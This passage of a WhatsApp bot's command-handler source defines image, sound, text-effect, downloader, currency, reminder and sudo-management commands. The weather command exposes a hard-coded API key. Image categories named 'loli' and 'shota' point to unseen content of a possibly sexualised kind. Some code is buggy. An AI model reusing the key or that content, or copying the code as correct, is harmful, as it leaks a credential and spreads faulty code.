if (/kaga/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kaga.json')
if (/kagura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kagura.json')
if (/kakasih/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kakasih.json')
if (/kaori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kaori.json')
if (/cartoon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kartun.json')
if (/shortquote/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/katakata.json')
if (/keneki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/keneki.json')
if (/kotori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kotori.json')
if (/kpop/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kpop.json')
if (/kucing/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kucing.json')
if (/kurumi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kurumi.json')
if (/lisa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/lisa.json')
if (/loli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/loli.json')
if (/madara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/madara.json')
if (/megumin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/megumin.json')
if (/mikasa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mikasa.json')
if (/mikey/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mikey.json')
if (/miku/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/miku.json')
if (/minato/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/minato.json')
if (/mobile/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mobil.json')
if (/motor/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/motor.json')
if (/mountain/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mountain.json')
if (/naruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/naruto.json')
if (/neko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/neko.json')
if (/neko2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/neko2.json')
if (/nekonime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/nekonime.json')
if (/nezuko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/nezuko.json')
if (/onepiece/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/onepiece.json')
if (/pentol/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pentol.json')
if (/pokemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pokemon.json')
if (/profil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/profil.json')
if (/progamming/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/programming.json')
if (/pubg/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pubg.json')
if (/randblackpink/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randblackpink.json')
if (/randomnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randomnime.json')
if (/randomnime2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randomnime2.json')
if (/rize/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/rize.json')
if (/rose/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/rose.json')
if (/ryujin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ryujin.json')
if (/sagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sagiri.json')
if (/sakura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sakura.json')
if (/sasuke/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sasuke.json')
if (/satanic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/satanic.json')
if (/shina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shina.json')
if (/shinka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shinka.json')
if (/shinomiya/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shinomiya.json')
if (/shizuka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shizuka.json')
if (/shota/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shota.json')
if (/space/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tatasurya.json')
if (/technology/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/technology.json')
if (/tejina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tejina.json')
if (/toukachan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/toukachan.json')
if (/tsunade/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tsunade.json')
if (/waifu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/waifu.json')
if (/wallhp/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallhp.json')
if (/wallml/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallml.json')
if (/wallmlnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallnime.json')
if (/yotsuba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yotsuba.json')
if (/yuki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yuki.json')
if (/yulibocil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yulibocil.json')
if (/yumeko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yumeko.json')
let yeha = heyy[Math.floor(Math.random() * heyy.length)]
David.sendMessage(m.chat, { image: { url: yeha }, caption : '`Here You Go!`' }, { quoted: m })
}
break             
            
case 'stupidcheck':case 'uncleancheck':
case 'hotcheck': case 'smartcheck':
case 'greatcheck':
case 'evilcheck':case 'dogcheck':
case 'coolcheck':
case 'gaycheck':
case 'waifucheck':
cantik = body.slice(1)
const okebnh1 =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const xeonkak = okebnh1[Math.floor(Math.random() * okebnh1.length)]
  let perc = `%`;
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xeonkak + perc
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: 'ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅᴀᴠɪᴅ ᴄʏʀɪʟ ᴛᴇᴄʜ ™'
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./anitav3.jpg') }, { upload: David.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🧐\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '',
                  newsletterName: '',
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await David.relayMessage(m.chat, msgs.message, {})
break


   case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161':
var resttt = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
 David.sendMessage(m.chat, { audio: resttt, mimetype: 'audio/mp4', ptt: true, 
})
break
        
        

        
            case 'listcase': {
const listCase = () => {
const code = fs.readFileSync("./QUEEN_ANITA-V4.js", "utf8")
var regex = /case\s+'([^']+)':/g;
var matches = [];
var match;
while ((match = regex.exec(code))) {
matches.push(match[1]);
}
let teks = `*Total Commands*: ${matches.length} \n\n` 
matches.forEach(function (x) {
   teks += "◦ " + x + "\n"
})
return teks
}
reply(listCase())
}
break
        
        
        // poto meker
        case 'glitchtext':
case 'writetext':
case 'advancedglow':
case 'typographytext':
case 'pixelglitch':
case 'neonglitch':
case 'flagtext':
case 'flag3dtext':
case 'deletingtext':
case 'blackpinkstyle':
case 'glowingtext':
case 'underwatertext':
case 'logomaker':
case 'cartoonstyle':
case 'papercutstyle':
case 'watercolortext':
case 'effectclouds':
case 'blackpinklogo':
case 'gradienttext':
case 'summerbeach':
case 'luxurygold':
case 'multicoloredneon':
case 'sandsummer':
case 'galaxywallpaper':
case '1917style':
case 'makingneon':
case 'royaltext':
case 'freecreate':
case 'galaxystyle':
case 'lighteffects':{

if (!text) return reply(`Example : ${prefix+command} QUEEN_ANITA-V3`) 
let link
if (/glitchtext/.test(command)) link = 'https://en.ephoto360.com/create-digital-glitch-text-effects-online-767.html'
if (/writetext/.test(command)) link = 'https://en.ephoto360.com/write-text-on-wet-glass-online-589.html'
if (/advancedglow/.test(command)) link = 'https://en.ephoto360.com/advanced-glow-effects-74.html'
if (/typographytext/.test(command)) link = 'https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html'
if (/pixelglitch/.test(command)) link = 'https://en.ephoto360.com/create-pixel-glitch-text-effect-online-769.html'
if (/neonglitch/.test(command)) link = 'https://en.ephoto360.com/create-impressive-neon-glitch-text-effects-online-768.html'
if (/flagtext/.test(command)) link = 'https://en.ephoto360.com/nigeria-3d-flag-text-effect-online-free-753.html'
if (/flag3dtext/.test(command)) link = 'https://en.ephoto360.com/free-online-american-flag-3d-text-effect-generator-725.html'
if (/deletingtext/.test(command)) link = 'https://en.ephoto360.com/create-eraser-deleting-text-effect-online-717.html'
if (/blackpinkstyle/.test(command)) link = 'https://en.ephoto360.com/online-blackpink-style-logo-maker-effect-711.html'
if (/glowingtext/.test(command)) link = 'https://en.ephoto360.com/create-glowing-text-effects-online-706.html'
if (/underwatertext/.test(command)) link = 'https://en.ephoto360.com/3d-underwater-text-effect-online-682.html'
if (/logomaker/.test(command)) link = 'https://en.ephoto360.com/free-bear-logo-maker-online-673.html'
if (/cartoonstyle/.test(command)) link = 'https://en.ephoto360.com/create-a-cartoon-style-graffiti-text-effect-online-668.html'
if (/papercutstyle/.test(command)) link = 'https://en.ephoto360.com/multicolor-3d-paper-cut-style-text-effect-658.html'
if (/watercolortext/.test(command)) link = 'https://en.ephoto360.com/create-a-watercolor-text-effect-online-655.html'
if (/effectclouds/.test(command)) link = 'https://en.ephoto360.com/write-text-effect-clouds-in-the-sky-online-619.html'
if (/blackpinklogo/.test(command)) link = 'https://en.ephoto360.com/create-blackpink-logo-online-free-607.html'
if (/gradienttext/.test(command)) link = 'https://en.ephoto360.com/create-3d-gradient-text-effect-online-600.html'
if (/summerbeach/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-free-595.html'
if (/luxurygold/.test(command)) link = 'https://en.ephoto360.com/create-a-luxury-gold-text-effect-online-594.html'
if (/multicoloredneon/.test(command)) link = 'https://en.ephoto360.com/create-multicolored-neon-light-signatures-591.html'
if (/sandsummer/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-576.html'
if (/galaxywallpaper/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-wallpaper-mobile-online-528.html'
if (/1917style/.test(command)) link = 'https://en.ephoto360.com/1917-style-text-effect-523.html'
if (/makingneon/.test(command)) link = 'https://en.ephoto360.com/making-neon-light-text-effect-with-galaxy-style-521.html'
if (/royaltext/.test(command)) link = 'https://en.ephoto360.com/royal-text-effect-online-free-471.html'
if (/freecreate/.test(command)) link = 'https://en.ephoto360.com/free-create-a-3d-hologram-text-effect-441.html'
if (/galaxystyle/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-style-free-name-logo-438.html'
if (/lighteffects/.test(command)) link = 'https://en.ephoto360.com/create-light-effects-green-neon-online-429.html'
let haldwhd = await ephoto(link, text)
David.sendMessage(m.chat, { image: { url: haldwhd }, caption: `Done` }, { quoted: m })
}
break


case 'animevideo': 
case 'amv': {
    if (!text) return reply('Enter the number, Sir\nExample: .animevideo 1')
    await loading() 
async function animeVideo() {
    const url = 'https://shortstatusvideos.com/anime-video-status-download/'; // Ganti dengan URL yang sesuai
    const response = await fetch(url);
    const html = await response.text();
    const $ = cheerio.load(html);
    const videos = [];
    $('a.mks_button.mks_button_small.squared').each((index, element) => {
        const href = $(element).attr('href');
        const title = $(element).closest('p').prevAll('p').find('strong').text();
        videos.push({
            title,
            source: href
        });
    });

    const randomIndex = Math.floor(Math.random() * videos.length);
    const randomVideo = videos[randomIndex];

    return randomVideo;
}

async function animeVideo2() {
    const url = 'https://mobstatus.com/anime-whatsapp-status-video/'; // Ganti dengan URL yang sesuai
    const response = await fetch(url);
    const html = await response.text();
    const $ = cheerio.load(html);

    const videos = [];

    const title = $('strong').text();

    $('a.mb-button.mb-style-glass.mb-size-tiny.mb-corners-pill.mb-text-style-heavy').each((index, element) => {
        const href = $(element).attr('href');
        videos.push({
            title,
            source: href
        });
    });

    const randomIndex = Math.floor(Math.random() * videos.length);
    const randomVideo = videos[randomIndex];

    return randomVideo;
}
    if (text == '1') {
        try {
            let resl = await animeVideo()
            let cap = `Here's the video`
            await David.sendFile(m.chat, resl.source, "", cap, m)
        } catch (e) {
            await reply(eror)
        }
    }
    if (text == '2') {
        try {
            let resl = await animeVideo2()
            let cap = `Here's the video`
            await David.sendFile(m.chat, resl.source, "", cap, m)
        } catch (e) {
            await reply('eror')
        }
    }
}
break   


case 'creatememe':
    const memeImageUrl = args[0];
    const topText = args[1];
    const bottomText = args[2];
    if (!memeImageUrl || !topText || !bottomText) return reply('Usage: .creatememe [image URL] [top text] [bottom text]');
    axios.get(`api.memegen.link/images/custom/${encodeURI(topText)}/${encodeURI(bottomText)}.jpg?background=${memeImageUrl}`, { responseType: 'arraybuffer' })
        .then(response => {
            const buffer = Buffer.from(response.data, 'binary');
            David.sendMessage(m.chat, { image: buffer, caption: 'Here is your meme!' });
        })
        .catch(() => reply('Could not create meme. Please check the image URL and try again.'));
    break;
 
        
        
        case 'shadow':
case 'write':
case 'romantic':
case 'burnpaper':
case 'smoke':
case 'narutobanner':
case 'love':
case 'undergrass':
case 'doublelove':
case 'coffecup':
case 'underwaterocean':
case 'smokyneon':
case 'starstext':
case 'rainboweffect':
case 'balloontext':
case 'metalliceffect':
case 'embroiderytext':
case 'flamingtext':
case 'stonetext':
case 'writeart':
case 'summertext':
case 'wolfmetaltext':
case 'nature3dtext':
case 'rosestext':
case 'naturetypography':
case 'quotesunder':
case 'shinetext':
{



if (!text) return reply(`Example : ${prefix + command} QUEEN_ANITA-V3`);
    reply("`Error!, Server Is Down`")
    await David.sendMessage(m?.chat, {react: {text: `⚠`,key: m?.key,}}) 
let link;
if (/stonetext/.test(command))
link =
  'https://photooxy.com/online-3d-white-stone-text-effect-utility-411.html';
if (/writeart/.test(command))
link =
  'photooxy.com/logo-and-text-effects/write-art-quote-on-wood-heart-370.html';
if (/summertext/.test(command))
link =
  'photooxy.com/logo-and-text-effects/3d-summer-text-effect-367.html';
if (/wolfmetaltext/.test(command))
link =
  'photooxy.com/logo-and-text-effects/create-a-wolf-metal-text-effect-365.html';
if (/nature3dtext/.test(command))
link =
  'photooxy.com/logo-and-text-effects/make-nature-3d-text-effects-364.html';
if (/rosestext/.test(command))
link =
  'photooxy.com/logo-and-text-effects/yellow-roses-text-360.html';
if (/naturetypography/.test(command))
link =
  'photooxy.com/logo-and-text-effects/create-vector-nature-typography-355.html';
if (/quotesunder/.test(command))
link =
  'photooxy.com/logo-and-text-effects/quotes-under-fall-leaves-347.html';
if (/shinetext/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/rainbow-shine-text-223.html';
if (/shadow/.test(command))
link =
  'photooxy.com/logo-and-text-effects/shadow-text-effect-in-the-sky-394.html';
if (/write/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/write-text-on-the-cup-392.html';
if (/romantic/.test(command))
link =
  'photooxy.com/logo-and-text-effects/romantic-messages-for-your-loved-one-391.html';
if (/burnpaper/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/write-text-on-burn-paper-388.html';
if (/smoke/.test(command))
link =
  'photooxy.com/other-design/create-an-easy-smoke-type-effect-390.html';
if (/narutobanner/.test(command))
link =
  'photooxy.com/manga-and-anime/make-naruto-banner-online-free-378.html';
if (/love/.test(command))
link =
  'photooxy.com/logo-and-text-effects/create-a-picture-of-love-message-377.html';
if (/undergrass/.test(command))
link =
  'photooxy.com/logo-and-text-effects/make-quotes-under-grass-376.html';
if (/doublelove/.test(command))
link =
  'photooxy.com/logo-and-text-effects/love-text-effect-372.html';
if (/coffecup/.test(command))
link =
  'photooxy.com/logo-and-text-effects/put-any-text-in-to-coffee-cup-371.html';
if (/underwaterocean/.test(command))
link =
  'photooxy.com/logo-and-text-effects/creating-an-underwater-ocean-363.html';
if (/smokyneon/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/make-smoky-neon-glow-effect-343.html';
if (/starstext/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/write-stars-text-on-the-night-sky-200.html';
if (/rainboweffect/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/glow-rainbow-effect-generator-201.html';
if (/balloontext/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/royal-look-text-balloon-effect-173.html';
if (/metalliceffect/.test(command))
link =
  'photooxy.com/logo-and-text-effects/illuminated-metallic-effect-177.html';
if (/embroiderytext/.test(command))
link =
  'photooxy.com/logo-and-text-effects/create-embroidery-text-online-191.html';
if (/flamingtext/.test(command))
link =
  'photooxy.com/logo-and-text-effects/realistic-flaming-text-effect-online-197.html';
let dehe = await photoOxy(link, text);
David.sendMessage(
m.chat,
{ image: { url: dehe }, caption: `Done`},
{ quoted: m }
);
}
break;
       
       
 case 'myip': {
 
  if (!isCreator) return m.reply(`For My Owner Only`);
  var http = require('http')
  http.get({
   'host': 'api.ipify.org',
   'port': 80,
   'path': '/'
  }, function(resp) {
       resp.on('data', function(ip) {
         m.reply("🔎 *Your Ip Address is :* " + ip);
       })
      })
}
break


 case 'ip':
if (!text) reply('give me IP address?')
let ipv = await (await fetch('https://endpoint.web.id/tools/cekip?key=gojou&id=' + text)).json();
if (ipv.status) {
 let shannz = ipv.result;
 let tesk = `*[ IP CHECKER ]*\n\nIP: ${shannz.ip}\nCity: ${shannz.city}\nCountry: ${shannz.country}\nLocation: ${shannz.loc}\nORG: ${shannz.org}\nPostal: ${shannz.postal}\nTime_Zone: ${shannz.timezone}\nMORE DETAIL: ${shannz.readme}`
reply(tesk)
} else {
reply('not found & error')
}
break      


case 'listcurrency':
    axios.get('https://api.exchangerate-api.com/v4/latest/USD')
        .then(response => {
            const currencies = Object.keys(response.data.rates);
            const currencyList = currencies.join(', ');
            reply(`Supported Currencies: ${currencyList}`);
        })
        .catch(() => reply('Could not retrieve the list of currencies. Please try again later.'));
    break;


case 'convert':
if (!text) reply(`Example: .convert 100 USD EUR`) 
    if (args.length < 3) {
        return reply('Usage: .convert [amount] [from currency] [to currency]');
    }

    const amount = parseFloat(args[0]);
    if (isNaN(amount)) {
        return reply('Please provide a valid number for the amount.');
    }

    const fromCurrency = args[1] ? args[1].toUpperCase() : null;
    const toCurrency = args[2] ? args[2].toUpperCase() : null;

    if (!fromCurrency || !toCurrency) {
        return reply('Please provide valid currency codes\nType *.listcurrencies*');
    }

    axios.get(`api.exchangerate-api.com/v4/latest/${fromCurrency}`)
        .then(response => {
            const rate = response.data.rates[toCurrency];
            if (!rate) {
                return reply('Invalid currency code.');
            }
            const convertedAmount = (amount * rate).toFixed(2);
            reply(`${amount} ${fromCurrency} = ${convertedAmount} ${toCurrency}`);
        })
        .catch(() => reply('Could not retrieve exchange rate data. Please try again.'));
    break;

case 'remindme':
if (!text) reply(`Example remindme 5, (reason)`) 
    const timee = parseInt(args[0]); // time in minutes
    const reminder = args.slice(1).join(' ');

    setTimeout(() => {
        reply(reminder);
    }, timee * 60 * 1000);

    reply(`Reminder set for ${timee} minutes.`);
    break;
 


case 'mediafire': {
	if (args.length == 0) return reply(`Where is the link?`)
	if (!isUrl(args[0]) && !args[0].includes('mediafire.com')) return reply(`The link you provided is invalid`)
await David.sendMessage(m?.chat, {react: {text: `⏱️`,key: m?.key,}})
await loading()  	
	const { mediafireDl } = require('./lib/mediafire.js')
	const baby1 = await mediafireDl(text)
	if (baby1[0].size.split('MB')[0] >= 10000) return reply('Oops, the file is too big...')
	const result4 = `*ANITA V3 MEDIAFIRE DOWNLOADER*

*❖ Name* : ${baby1[0].nama}
*❖ Size* : ${baby1[0].size}
*❖ Mime* : ${baby1[0].mime}
*❖ Link* : ${baby1[0].link}`
reply(`${result4}`)
David.sendMessage(m.chat, { document : { url : baby1[0].link}, fileName : baby1[0].nama, mimetype: baby1[0].mime }, { quoted : m })
await David.sendMessage(m?.chat, {react: {text: `✅`,key: m?.key,}})
}
break
       
        
// Audio Download Command
case 'audio2': {
    if (!m.quoted) return reply('Please reply to the song search result to download the audio.');
    await David.sendMessage(m?.chat, {react: {text: `🎧`, key: m?.key}});

    let url = global.db.data.users[m.sender].lastSearchUrl || m.quoted?.text.match(/https?:\/\/[^\s]+/g)?.[0];
    if (!url) return reply('No song URL found. Please use the *song* command first.');

    try {
        let apiUrl = `https://api-lenwy.vercel.app/mp3?url=${encodeURIComponent(url)}`;
        let result;
        let maxAttempts = 10; // Maximum attempts (10 * 15s = 150s max wait time)
        let attempt = 0;

        while (attempt < maxAttempts) {
            result = await (await fetch(apiUrl)).json();

            // Check if download_url is available and not "Converting"
            if (result.status === 200 && result.data.download_url !== "Converting") {
                let audioUrl = result.data.download_url;
                let title = result.data.title;
                let body = `*Audio Download*\n> Title: ${title}\n> Type: ${result.data.type}`;

                // Send the audio to the user
                await David.sendMessage(m.chat, { audio: { url: audioUrl }, mimetype: 'audio/mp4', caption: body }, { quoted: m });
                break;
            }

            // Increment attempt and wait for 15 seconds before retrying
            attempt++;
            await new Promise(resolve => setTimeout(resolve, 15000));
        }

        // If no valid download URL after max attempts, send an error message
        if (attempt === maxAttempts) {
            reply('Error! Could not retrieve audio URL after multiple attempts. Please try again later.');
        }

    } catch (error) {
        reply('Error fetching audio. Please try again.');
    }
}
break;


  case 'delsession':
            case 'clearsession': {
                if (!isCreator) return reply("?")
                fs.readdir("./session", async function(err, files) {
                    if (err) {
                        console.log('Unable to scan directory: ' + err);
                        return reply('Unable to scan directory: ' + err);
                    }
                    let filteredArray = await files.filter(item => item.startsWith("pre-key") ||
                        item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state")
                    )
                    console.log(filteredArray.length);
                    let teks = `Bentar..`
                    if (filteredArray.length == 0) return reply(teks)
                    filteredArray.map(function(e, i) {
                        teks += (i + 1) + `. ${e}\n`
                    })
                    
                    
                    await filteredArray.forEach(function(file) {
                        fs.unlinkSync(`./session/${file}`)
                    });
                    await sleep(2000)
                    reply("Success")
                });
            }
            break
            
   case 'kdrama': {
  if (!text) {
    throw 'Example: Drakor The Red Sleeve';
  }
  reply('Looking for Korean drama information...');
  try {
    const url = `https://mydramalist.com/search?q=${encodeURIComponent(q)}`;
    const response = await axios.get(url);
    const $ = cheerio.load(response.data);
    const judul = $('.title').first().text().trim();
    const konten = $('.content').first().find('p').map((i, el) => $(el).text().trim()).get().join('\n\n');
    const link = $('.title').first().find('a').attr('href');
// wm avs    
    if (!konten) {
      throw new Error('Not That Korean Drama.');
    }
// wm avs
    const artikel = `*Title:* ${judul}\n\n*Content:* ${konten}\n\n*Link:* https://mydramalist.com${link}`;
    reply(artikel);
  } catch (error) {
    reply(`Sorry, something went wrong: ${error.message}`);
  }
}
break 

case 'addsudo': {
    if (!isCreator) return reply("Only the bot owner can manage sudo users.");

    const newSudo = args[0] + "@s.whatsapp.net"; // Expect phone number without @s.whatsapp.net
    if (!args[0] || isNaN(args[0])) return reply("Please provide a valid phone number.");

    if (global.sudoUsers.includes(newSudo)) {
        reply("This user is already a sudo user.");
    } else {
        global.sudoUsers.push(newSudo);
        reply(`User @${args[0]} has been added as a sudo user.`);
    }
    break;
}

case 'delsudo': {
    if (!isCreator) return reply("Only the bot owner can manage sudo users.");

    const removeSudo = args[0] + "@s.whatsapp.net"; // Expect phone number without @s.whatsapp.net
    if (!args[0] || isNaN(args[0])) return reply("Please provide a valid phone number.");

    if (!global.sudoUsers.includes(removeSudo)) {
        reply("This user is not a sudo user.");
    } else {
        global.sudoUsers = global.sudoUsers.filter((user) => user !== removeSudo);
        reply(`User @${args[0]} has been removed from sudo users.`);
    }
    break;
}







  


case 'weather':{
await David.sendMessage(m?.chat, {react: {text: `🤨`,key: m?.key,}})
if (!text) return reply('*Please Give Me a Location?*')
await David.sendMessage(m?.chat, {react: {text: `🔎`,key: m?.key,}})
            let wdata = await axios.get(
                `https://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273&language=en`
            );           
            let textw = ""
            textw += `*🗺️Weather of  ${text}*\n\n`
            textw += `*Weather:-* ${wdata.data.weather[0].main}\n`
